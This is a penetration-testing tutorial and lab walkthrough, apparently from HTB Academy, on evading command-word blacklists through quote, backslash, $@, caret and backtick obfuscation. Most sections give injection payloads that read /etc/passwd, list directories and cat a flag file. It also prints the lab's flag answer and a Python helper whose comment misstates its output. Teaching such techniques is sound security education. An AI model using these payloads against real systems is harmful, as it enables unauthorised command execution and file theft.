# Bypassing Blacklisted Commands

> **🎭 Command Obfuscation:** Techniques to disguise commands and bypass word-based filters

## Overview

We have discussed various methods for bypassing single-character filters. However, there are different methods when it comes to bypassing blacklisted commands. A command blacklist usually consists of a set of words, and if we can obfuscate our commands and make them look different, we may be able to bypass the filters.

There are various methods of command obfuscation that vary in complexity. We will cover basic techniques that may enable us to change the look of our command to bypass filters manually.

---

## Understanding Command Blacklists

### Basic Command Blacklist Filter

A basic command blacklist filter in PHP would look like the following:

```php
$blacklist = ['whoami', 'cat', 'ls', 'id', 'pwd', ...];
foreach ($blacklist as $word) {
    if (strpos($_POST['ip'], $word) !== false) {
        echo "Invalid input";
    }
}
```

**Key Points:**
- Checks for **exact matches** of blacklisted words
- Case-sensitive in most implementations
- Can be bypassed through **obfuscation techniques**
- May also block common file paths like `/etc/passwd`

### Testing for Command Blacklists

After successfully bypassing character filters, test if commands are blacklisted:

```http
# Test basic command injection
127.0.0.1%0awhoami

# If blocked, you'll see:
Response: "Invalid input"
```

This indicates a **command-based filter** is active.

---

## Cross-Platform Obfuscation Techniques

### Quote Injection (Linux & Windows)

> **🔗 Universal Method:** Works on both Bash and PowerShell

**Single Quotes:**
```bash
# Original command
whoami

# Obfuscated with single quotes
w'h'o'am'i
w'ho'ami
wh'o'ami
```

**Double Quotes:**
```bash
# Obfuscated with double quotes  
w"h"o"am"i
w"ho"ami
wh"o"ami
```

**Important Rules:**
- ✅ **Even number** of quotes required
- ✅ **Cannot mix** quote types in same command
- ✅ Works with **any command** (cat, ls, id, etc.)

### HTB Academy Lab Example

**Testing Quote Obfuscation:**
```http
POST /check HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%0aw'h'o'am'i
```

**Expected Result:**
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss

root
```

---

## Linux-Only Obfuscation Techniques

### Backslash Escaping

**Method:**
```bash
# Original command
whoami

# Obfuscated with backslashes
w\ho\am\i
wh\oami
who\ami
```

**Advantages:**
- ✅ **Odd or even** number of characters
- ✅ **Flexible placement** 
- ✅ Works with **any position** in command

### Positional Parameter ($@)

**Method:**
```bash
# Original command
whoami

# Obfuscated with $@
who$@ami
w$@hoami
wh$@oami
```

**Technical Note:** `$@` represents positional parameters in Bash, but when empty, it's ignored during command execution.

### Combined Linux Techniques

**Advanced Obfuscation:**
```bash
# Multiple techniques combined
w\h'o'$@ami
c'a'\t$@${PATH:0:1}etc${PATH:0:1}passwd
```

---

## Windows-Only Obfuscation Techniques

### Caret Character (^)

**Method:**
```batch
# Original command
whoami

# Obfuscated with caret
who^ami
w^ho^ami
wh^o^ami
```

**PowerShell Alternative:**
```powershell
# Using backtick escape character
who`ami
wh`o`ami
```

---

## HTB Academy Lab Solution

### Challenge: Command Blacklist Bypass

**Target:** Find the content of `flag.txt` in the home folder of the previously discovered user.

**Previous Context:** 
- User found: `1nj3c70r` (from `/home` directory listing)
- Need to read: `/home/1nj3c70r/flag.txt`

### Step-by-Step Solution

**Method 1: Quote Obfuscation**
```http
# URL-encoded payload
ip=127.0.0.1%0ac'a't$IFS${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt

# Decoded payload breakdown:
127.0.0.1           # Valid IP to pass initial validation
%0a                 # Newline injection operator (bypasses semicolon filter)
c'a't               # "cat" command obfuscated with single quotes
$IFS                # Space character replacement
${PATH:0:1}         # "/" character from environment variable
home                # Directory name
${PATH:0:1}         # Another "/" character
1nj3c70r            # Username discovered in previous step
${PATH:0:1}         # Another "/" character  
flag.txt            # Target filename

# Actual executed command: cat /home/1nj3c70r/flag.txt
```

**Method 2: Backslash Obfuscation (Linux)**
```http
ip=127.0.0.1%0ac\a\t$IFS${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

**Method 3: Mixed Techniques**
```http
ip=127.0.0.1%0ac'a't$IFS${PATH:0:1}h'o'me${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

### Lab Answer Format

**Expected Flag Content:**
```
HTB{c0mm4nd_1nj3c710n_f1l73r_byp455}
```

---

## Advanced Obfuscation Examples

### File Reading Techniques

**Obfuscating `cat /etc/passwd`:**
```bash
# Method 1: Quotes + Environment Variables
c'a't$IFS${PATH:0:1}e't'c${PATH:0:1}p'a'sswd

# Method 2: Backslash Escaping  
c\a\t$IFS${PATH:0:1}e\tc${PATH:0:1}pa\sswd

# Method 3: Mixed Techniques
c'a'\t$IFS${PATH:0:1}et'c'${PATH:0:1}pas'sw'd
```

### Directory Listing Techniques

**Obfuscating `ls -la /home`:**
```bash
# Method 1: Quote Obfuscation
l's'$IFS-l'a'$IFS${PATH:0:1}h'o'me

# Method 2: Tab Replacement + Quotes
l's'%09-l'a'%09${PATH:0:1}h'o'me
```

---

## Detection & Testing Methodology

### 1. Identify Blacklisted Commands

**Test Common Commands:**
```bash
# Test each command individually
whoami    # Often blacklisted
id        # Often blacklisted  
cat       # Often blacklisted
ls        # Often blacklisted
pwd       # Sometimes blacklisted
echo      # Rarely blacklisted
```

### 2. Test Obfuscation Methods

**Systematic Testing:**
```bash
# Step 1: Single quote method
w'h'o'am'i

# Step 2: Double quote method  
w"h"o"am"i

# Step 3: Backslash method (Linux)
w\ho\am\i

# Step 4: Mixed methods
w'h'o\am'i'
```

### 3. Character Combination

**Advanced Payload Construction:**
```bash
# Combine all bypass techniques:
# - Newline injection operator (%0a)
# - Environment variable space replacement ($IFS)  
# - Environment variable path extraction (${PATH:0:1})
# - Command obfuscation with quotes (c'a't)

127.0.0.1%0ac'a't$IFS${PATH:0:1}path${PATH:0:1}to${PATH:0:1}file
```

---

## Practical Applications

### 1. Web Application Testing

**Burp Suite Intruder Setup:**
```
# Payload positions for command obfuscation
127.0.0.1%0a§c'a't§$IFS${PATH:0:1}etc${PATH:0:1}passwd

# Payload list:
cat
c'a't  
c"a"t
c\a\t
c'a'\t
```

### 2. Automated Obfuscation

**Python Script Example:**
```python
def obfuscate_command(cmd):
    """Simple quote-based obfuscation"""
    obfuscated = ""
    for i, char in enumerate(cmd):
        if i % 2 == 0:
            obfuscated += f"'{char}'"
        else:
            obfuscated += char
    return obfuscated

# Usage
original = "whoami"
obfuscated = obfuscate_command(original)  # w'h'oam'i'
```

---

## Key Takeaways

### ✅ **Universal Techniques**
- **Quote injection** works on all platforms
- **Environment variables** provide character flexibility
- **Multiple bypasses** can be combined

### 🎯 **Platform-Specific** 
- **Linux:** Backslash (`\`) and positional parameters (`$@`)
- **Windows:** Caret (`^`) and backtick (`` ` ``)

### 🔧 **Best Practices**
- **Test systematically** - one technique at a time
- **Combine methods** for complex filters
- **Use automation** for efficiency in assessments

This comprehensive approach to command obfuscation enables penetration testers to bypass sophisticated word-based filtering mechanisms while maintaining reliable command execution. 